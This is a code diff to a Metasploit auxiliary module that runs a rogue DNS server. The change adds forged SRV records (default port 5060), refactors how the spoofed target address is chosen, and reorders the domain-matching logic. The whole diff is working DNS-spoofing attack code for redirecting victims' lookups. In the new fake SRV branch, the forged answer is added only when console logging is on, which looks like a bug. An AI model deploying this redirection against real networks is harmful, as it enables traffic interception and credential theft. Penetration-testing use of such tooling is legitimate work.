@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
         This module provides a DNS service that redirects
       all queries to a particular address.
       },
-      'Author'      => ['ddz', 'hdm'],
+      'Author'      => ['ddz', 'hdm', 'fozavci'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
@@ -44,22 +44,27 @@ class Metasploit3 < Msf::Auxiliary
 
     register_advanced_options(
       [
+        OptPort.new('RR_SRV_PORT', [ false, "The port field in the SRV response when FAKE", 5060]),
         OptBool.new('LogConsole', [ false, "Determines whether to log all request to the console", true]),
         OptBool.new('LogDatabase', [ false, "Determines whether to log all request to the database", false]),
       ], self.class)
   end
 
 
+  def target_host(addr = nil)
+    target = datastore['TARGETHOST']
+    if target.blank?
+      if addr
+        ::Rex::Socket.source_address(addr)
+      else
+        nil
+      end
+    else
+      ::Rex::Socket.resolv_to_dotted(target)
+    end
+  end
+
   def run
-    @targ = datastore['TARGETHOST']
-    if(@targ and @targ.strip.length == 0)
-      @targ = nil
-    end
-
-    if(@targ)
-      @targ = ::Rex::Socket.resolv_to_dotted(@targ)
-    end
-
     @port = datastore['SRVPORT'].to_i
 
     @log_console  = false
@@ -90,10 +95,12 @@ class Metasploit3 < Msf::Auxiliary
     while @run
       @error_resolving = false
       packet, addr = @sock.recvfrom(65535)
+      src_addr = addr[3]
       @requestor = addr
-      break if packet.length == 0
+      next if packet.length == 0
 
       request = Resolv::DNS::Message.decode(packet)
+      next unless request.qr == 0
 
       #
       # XXX: Track request IDs by requesting IP address and port
@@ -109,6 +116,18 @@ class Metasploit3 < Msf::Auxiliary
       lst = []
 
       request.each_question {|name, typeclass|
+        # Identify potential domain exceptions
+        @match_target = false
+        @match_name = name.to_s
+        @domain_target_list.each do |ex|
+          escaped = Regexp.escape(ex).gsub('\*','.*?')
+          regex = Regexp.new "^#{escaped}$", Regexp::IGNORECASE
+          if ( name.to_s =~ regex )
+            @match_target = true
+            @match_name = ex
+          end
+        end
+
         tc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, "")
 
         request.qr = 1
@@ -130,25 +149,12 @@ class Metasploit3 < Msf::Auxiliary
           # <hostname> SOA -> windows XP self hostname lookup
           #
 
-          answer = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
-
-          # Identify potential domain exceptions
-          @match_target = false
-          @match_name = name.to_s
-          @domain_target_list.each do |ex|
-            escaped = Regexp.escape(ex).gsub('\*','.*?')
-            regex = Regexp.new "^#{escaped}$", Regexp::IGNORECASE
-            if ( name.to_s =~ regex )
-              @match_target = true
-              @match_name = ex
-            end
-          end
+          answer = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
 
           if (@match_target and not @bypass) or (not @match_target and @bypass)
             # Resolve FAKE response
             if (@log_console)
-              print_status("DNS target domain found: #{@match_name}")
-              print_status("DNS target domain #{name.to_s} faked")
+              print_status("DNS target domain #{@match_name} found; Returning fake A records for #{name}")
             end
           else
             # Resolve the exception domain
@@ -160,8 +166,7 @@ class Metasploit3 < Msf::Auxiliary
               next
             end
             if (@log_console)
-              print_status("DNS bypass domain found: #{@match_name}")
-              print_status("DNS bypass domain #{name.to_s} resolved #{ip}")
+              print_status("DNS bypass domain #{@match_name} found; Returning real A records for #{name}")
             end
           end
 
@@ -171,16 +176,54 @@ class Metasploit3 < Msf::Auxiliary
         when 'IN::MX'
           mx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create("mail.#{name}"))
           ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
-          ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
           request.add_answer(name, 60, mx)
           request.add_authority(name, 60, ns)
           request.add_additional(Resolv::DNS::Name.create("mail.#{name}"), 60, ar)
 
         when 'IN::NS'
           ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
-          ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
+          ar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))
           request.add_answer(name, 60, ns)
           request.add_additional(name, 60, ar)
+
+        when 'IN::SRV'
+          if @bypass || !@match_target
+            if @log_console
+              print_status("DNS bypass domain #{@match_name} found; Returning real SRV records for #{name}")
+            end
+            # if we are in bypass mode or we are in fake mode but the target didn't match,
+            # just return the real response RRs
+            resources = Resolv::DNS.new().getresources(Resolv::DNS::Name.create(name), Resolv::DNS::Resource::IN::SRV)
+            if resources.empty?
+              @error_resolving = true
+              print_error("Unable to resolve SRV record for #{name} -- skipping")
+              next
+            end
+            resources.each do |resource|
+              host = resource.target
+              port = resource.port.to_i
+              weight = resource.weight.to_i
+              priority = resource.priority.to_i
+              ttl = resource.ttl.to_i
+              request.add_answer(
+                name,
+                ttl,
+                Resolv::DNS::Resource::IN::SRV.new(priority, weight, port, Resolv::DNS::Name.create(host))
+              )
+            end
+          else
+            if @log_console
+              print_status("DNS target domain #{@match_name} found; Returning fake SRV records for #{name}")
+              # Prepare the FAKE response
+              request.add_answer(
+                name,
+                10,
+                Resolv::DNS::Resource::IN::SRV.new(5, 0, datastore['RR_SRV_PORT'], Resolv::DNS::Name.create(name))
+              )
+              request.add_additional(Resolv::DNS::Name.create(name), 60, Resolv::DNS::Resource::IN::A.new(target_host(src_addr)))
+            end
+          end
         when 'IN::PTR'
           soa = Resolv::DNS::Resource::IN::SOA.new(
             Resolv::DNS::Name.create("ns.internet.com"),
